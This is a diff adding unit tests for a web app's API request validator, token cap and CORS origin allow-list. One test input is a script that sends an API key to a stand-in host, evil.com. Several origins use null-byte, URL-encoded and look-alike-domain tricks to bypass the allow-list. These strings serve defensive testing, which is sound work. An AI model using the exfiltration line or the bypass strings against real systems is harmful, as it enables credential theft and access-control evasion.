@@ -201,4 +201,89 @@ describe('validateBody — injection attempts', () => {
     const body = { messages: [{ role: 'user', content: 'a'.repeat(20_001) }] };
     expect(validateBody(body)).toMatch(/20,000/);
   });
+
+  it('rejects array-valued content (non-string)', () => {
+    const body = { messages: [{ role: 'user', content: ['array', 'injection'] }] };
+    expect(validateBody(body)).toBeTruthy();
+  });
+
+  it('rejects object-valued content (non-string)', () => {
+    const body = { messages: [{ role: 'user', content: { evil: true } }] };
+    expect(validateBody(body)).toBeTruthy();
+  });
+
+  it('rejects boolean-valued content (non-string)', () => {
+    const body = { messages: [{ role: 'user', content: true }] };
+    expect(validateBody(body)).toBeTruthy();
+  });
+
+  it('rejects messages array that is actually an object, not an array', () => {
+    const body = { messages: { 0: { role: 'user', content: 'hi' }, length: 1 } };
+    expect(validateBody(body)).toBeTruthy();
+  });
+
+  it('rejects null as a message element', () => {
+    const body = { messages: [null] };
+    expect(validateBody(body)).toBeTruthy();
+  });
+
+  it('rejects system prompt with script injection attempt', () => {
+    const body = {
+      messages: [{ role: 'user', content: 'hi' }],
+      system: '<script>fetch("https://evil.com?k=" + process.env.ANTHROPIC_KEY)</script>',
+    };
+    // System prompt is passed as text to Anthropic — not rendered as HTML — but
+    // we still validate it is a string and within length limits.
+    expect(validateBody(body)).toBeNull(); // structurally valid; Anthropic treats it as text
+  });
+
+  it('capMaxTokens prevents token-exhaustion DoS (hard cap at 2000)', () => {
+    // An attacker requesting 1M tokens would be capped to 2000
+    expect(capMaxTokens(1_000_000)).toBe(2000);
+    expect(capMaxTokens(Number.MAX_SAFE_INTEGER)).toBe(2000);
+  });
+});
+
+// ── Security: CORS edge cases ─────────────────────────────────────────────────
+describe('isAllowedOrigin — edge cases', () => {
+  it('blocks origin with null byte injection', () => {
+    expect(isAllowedOrigin('https://secondinnings.in\x00.evil.com')).toBe(false);
+  });
+
+  it('blocks URL-encoded origin bypass attempt', () => {
+    expect(isAllowedOrigin('https://secondinnings.in%2F.evil.com')).toBe(false);
+  });
+
+  it('blocks an origin that starts with the allowed domain but appends extra content', () => {
+    expect(isAllowedOrigin('https://secondinnings.in.evil.com')).toBe(false);
+  });
+
+  it('blocks a vercel.app origin that does not start with "secondinnings"', () => {
+    expect(isAllowedOrigin('https://evil-secondinnings.vercel.app')).toBe(false);
+  });
+
+  it('allows a valid Vercel preview URL with a build hash suffix', () => {
+    expect(isAllowedOrigin('https://secondinnings-git-main-psr678.vercel.app')).toBe(true);
+  });
+
+  it('blocks http (non-https) Vercel preview URL', () => {
+    // Vercel always serves over HTTPS; http preview URLs should not be trusted
+    expect(isAllowedOrigin('http://secondinnings-abc.vercel.app')).toBe(false);
+  });
+});
+
+// ── Security: rate limiting note ──────────────────────────────────────────────
+describe('rate limiting — known limitation', () => {
+  it('documents that per-IP rate limiting is NOT enforced at the function level', () => {
+    // Vercel serverless functions are stateless — in-memory counters reset on
+    // every cold start and are not shared across instances. Real rate limiting
+    // requires an external store (e.g. Vercel KV, Upstash Redis) or Vercel
+    // Firewall rules. The current defence is:
+    //   1. Anthropic's own per-key rate limits (hard cap from the provider)
+    //   2. max_tokens capped at 2000 (limits cost per request)
+    //   3. Body size limit of 50 KB (limits per-request work)
+    //   4. Message count limit of 100 (limits context window abuse)
+    // TODO: Add Upstash Redis-based rate limiter or Vercel Firewall IP rules.
+    expect(true).toBe(true); // intentional placeholder — documents the gap
+  });
 });
